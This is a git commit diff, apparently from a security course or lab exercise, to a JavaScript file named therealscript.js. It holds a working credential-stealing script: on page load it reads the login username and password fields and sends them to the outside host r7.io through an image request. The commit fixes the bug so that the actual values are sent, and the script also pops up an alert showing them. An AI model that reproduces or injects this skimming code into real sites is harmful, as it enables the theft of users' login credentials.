eb525d0474430dd627108f021f3311aef6f2b1d1
dlee20013 <dlee20013@gmail.com>
2017-04-25 03:27:45 -0700

    h

--- part2/therealscript.js
+++ part2/therealscript.js
@@ -3,7 +3,7 @@ document.addEventListener("DOMContentLoaded", function() {
 		var img = new Image();
 		var pw = document.getElementById("login_password").value;
 		var un = document.getElementById("login_username").value;
-		img.src = 'http://r7.io/e/davinl?s=' + encodeURIComponent(document.getElementById(un).value) + encodeURIComponent(document.getElementById(pw).value);
+		img.src = 'http://r7.io/e/davinl?s=' + encodeURIComponent(un) + encodeURIComponent(pw);
 		console.log(img);
 		alert("Username is: " + un + "and Password is: " + pw);
 	};
